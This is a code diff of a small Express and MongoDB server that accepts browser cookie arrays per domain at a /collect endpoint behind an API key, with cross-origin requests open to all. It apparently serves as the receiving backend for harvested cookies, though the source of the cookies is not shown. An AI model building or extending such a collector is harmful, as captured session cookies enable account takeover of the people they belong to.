@@ -1,39 +1,53 @@
 import express from "express";
 import mongoose from "mongoose";
 import dotenv from "dotenv";
+import cors from "cors";
 
 dotenv.config();
 
 const app = express();
+app.use(cors());
 app.use(express.json({ limit: "10mb" }));
 
 // ⭐ Connect to MongoDB
-mongoose.connect(process.env.MONGO_URL)
-    .then(() => console.log("Connected to MongoDB"))
-    .catch(err => console.error(err));
+mongoose
+  .connect(process.env.MONGO_URL)
+  .then(() => console.log("MongoDB connected"))
+  .catch(err => console.error("MongoDB error:", err));
 
-// ⭐ Schema
+// ⭐ Cookie schema
 const CookieSchema = new mongoose.Schema({
-    host: String,
-    cookies: Array,
-    collectedAt: { type: Date, default: Date.now }
+  domain: String,
+  cookies: Array,
+  collectedAt: { type: Date, default: Date.now }
 });
 
 const CookieModel = mongoose.model("Cookie", CookieSchema);
 
-// ⭐ Secure private endpoint
+// ⭐ Simple API key protection
 app.post("/collect", async (req, res) => {
-    try {
-        const { host, cookies } = req.body;
+  try {
+    const apiKey = req.headers["x-api-key"];
 
-        await CookieModel.create({ host, cookies });
-
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
+    if (!apiKey || apiKey !== process.env.MASTER_API_KEY) {
+      return res.status(401).json({ error: "Unauthorized" });
     }
+
+    const { domain, cookies } = req.body;
+
+    await CookieModel.create({ domain, cookies });
+
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-// ⭐ Your local port
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
+// ⭐ Root
+app.get("/", (req, res) => {
+  res.send("Cookie backend is running.");
+});
+
+// ⭐ Start server
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log("Backend running on port", PORT));
